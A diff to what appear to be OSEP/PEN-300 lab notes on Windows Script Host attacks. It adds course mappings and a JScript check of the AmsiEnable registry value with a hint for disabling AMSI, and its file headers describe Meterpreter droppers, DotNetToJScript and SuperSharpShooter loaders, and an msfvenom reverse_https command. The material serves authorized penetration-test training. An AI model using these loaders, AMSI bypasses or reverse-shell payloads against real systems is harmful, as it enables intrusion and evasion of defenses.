@@ -6,6 +6,8 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 > **Covers scenarios:** 9–10
 >
+> **Course mapping:** Chapter 7 (§7.1 Basic Dropper in JScript, §7.2 JScript and C# / DotNetToJScript / SharpShooter), Chapter 9 (§9.1.2 Reflective C# in Client-Side Attacks), Chapter 12 (§12.6 Bypassing AMSI in JScript)
+>
 > **Prerequisites:** target still has Windows Script Host (`cscript` / `wscript`); target has .NET Framework (2.0/3.5 or 4.x); attacker has `msfvenom`, an HTTP service, and an MSF listener; a tool host that can run .NET to generate DotNetToJScript / SuperSharpShooter artifacts (Windows, or Linux + mono/python)
 
 ## Background: why WSH can bypass “EXE restricted”
@@ -86,7 +88,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
  *      into a chosen process from the constructor. Serialized into JScript by
  *      DotNetToJScript / SuperSharpShooter; deserialized and activated inside
  *      the WSH process with no EXE on disk (scenario 9 main path).
- * Scenario: 9, 10 (cheat sheet JScript > Meterpreter Loader with DotNetToJScript)
+ * Scenario: 9, 10 (quick-reference notes JScript > Meterpreter Loader with DotNetToJScript)
  * Dependencies: .NET Framework SDK csc.exe (compile on a Windows tool host);
  *      runtime needs the matching CLR (v4 by default). Injected target process
  *      must exist and match bitness.
@@ -101,7 +103,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
  *  4) Generate bridge JS and deliver (see docs/03 scenario 9 step 3):
  *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
  * Placeholders: PAYLOAD (msfvenom -f csharp bytes), TARGET_PROCESS (default explorer)
- * Test status: Not compiled / not lab-tested; structure matches the cheat sheet
+ * Test status: Not compiled / not lab-tested; structure matches the quick-reference notes
  *     TestClass.cs — compile on a tool host and verify on a lab target before use.
  */
 
@@ -231,6 +233,15 @@ try {
 
 // String known to be AMSI-flagged (lab purpose, not a real payload):
 // This content should not produce any effect — only observe whether it is blocked.
+// (A.2) PEN-300 §12.6 check/set HKCU AmsiEnable registry value
+var amsiRegPath = "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings\\AmsiEnable";
+try {
+    var curAmsi = shell.RegRead(amsiRegPath);
+    WScript.Echo("  HKCU AmsiEnable: " + curAmsi + " (0=WSH AMSI disabled)");
+} catch (eReg) {
+    WScript.Echo("  HKCU AmsiEnable: not set (enabled by default; disable via shell.RegWrite(amsiRegPath, 0, 'REG_DWORD'))");
+}
+
 var EVAL_TEST_CONTENT = "var x = 'Invoke-Mimikatz';"; // replace with a minimal signature fragment of content you plan to deliver
 try {
     eval(EVAL_TEST_CONTENT);
@@ -258,7 +269,7 @@ WScript.Quit(0);
  *      9/10 when "script entry works": download stage-2 script/data and avoid
  *      putting attack logic in the attachment body (scenario 10 A/B split,
  *      stage A).
- * Scenario: 9, 10 (cheat sheet JScript > Simple Meterpreter Dropper)
+ * Scenario: 9, 10 (quick-reference notes JScript > Simple Meterpreter Dropper)
  * Dependencies: Windows Script Host (cscript / wscript); target can reach
  *      attacker HTTP; MSXML2.XMLHTTP and ADODB.Stream are built-in.
  * Usage:
@@ -269,7 +280,7 @@ WScript.Quit(0);
  *      RUN_AFTER_DOWNLOAD=0/1 (1 = run downloaded .js with a new cscript process
  *      for A/B separation)
  * Test status: JS syntax checked with node --check; not tested under Windows
- *     WSH; structure follows the cheat sheet Simple Meterpreter Dropper —
+ *     WSH; structure follows the quick-reference notes Simple Meterpreter Dropper —
  *     verify in the lab.
  * Note: this file only downloads and (optionally) runs files you yourself host
  *     for authorized testing.
@@ -327,7 +338,7 @@ WScript.Quit(0);
  *      the standard generation commands; (b) preflights host bitness/.NET
  *      before delivery; (c) when hand-assembling, paste the tool output into
  *      the paste zone below.
- * Scenario: 9, 10 (cheat sheet JScript > Meterpreter Loader with DotNetToJScript)
+ * Scenario: 9, 10 (quick-reference notes JScript > Meterpreter Loader with DotNetToJScript)
  * Dependencies: Windows tool host + DotNetToJScript.exe; target WSH + .NET
  *      (v4 or v2).
  * Usage:
@@ -389,7 +400,7 @@ WScript.Quit(0);
  *      it reads same-dir / given-path payload.js (SuperSharpShooter stage 2)
  *      and executes it. Useful for swapping artifacts quickly on a target and
  *      for testing whether "A/B split + new process" dodges content scanning.
- * Scenario: 10, 9 alternate (cheat sheet JScript > Meterpreter with SuperSharpShooter)
+ * Scenario: 10, 9 alternate (quick-reference notes JScript > Meterpreter with SuperSharpShooter)
  * Dependencies: target WSH; payload.js from SuperSharpShooter (tool-host Python is enough):
  *      msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
  *      ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
